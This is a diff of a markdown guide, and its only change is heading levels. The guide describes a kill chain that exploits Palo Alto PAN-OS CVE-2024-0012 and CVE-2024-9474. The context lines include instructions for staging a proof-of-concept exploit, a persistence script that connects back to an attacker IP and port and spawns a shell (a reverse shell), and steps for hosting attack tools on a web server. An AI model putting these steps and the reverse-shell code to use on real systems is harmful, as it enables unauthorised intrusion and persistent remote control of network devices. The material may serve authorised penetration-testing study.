@@ -22,7 +22,7 @@ CVE: CVE-2024-0012 and CVE-2024-9474
  
 # Phase 0: Initial Setup for Kill Chain
 
-Exploit Setup:
+## Exploit Setup:
 
 1. Create a new folder on your attack box as this will be used to stage all of the required files and scripts.
 2. Open a text editor on the attack machine (preferably nano).
@@ -31,7 +31,7 @@ Exploit Setup:
 5. `chmod +x PoC.py`
    
 
-Persistence Script Setup:
+## Persistence Script Setup:
 
 1. Perform the following command: `nano pan_os_comm.py`
 2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
@@ -59,7 +59,7 @@ pty.spawn("sh")
 
 ```
 
-*Host Your Tools Folder On A Web Server*
+### *Host Your Tools Folder On A Web Server*
 
 1. In the folder where you have created your tools, start a web server to host the necessary files for the exploit
    Run the below command to start the web server:
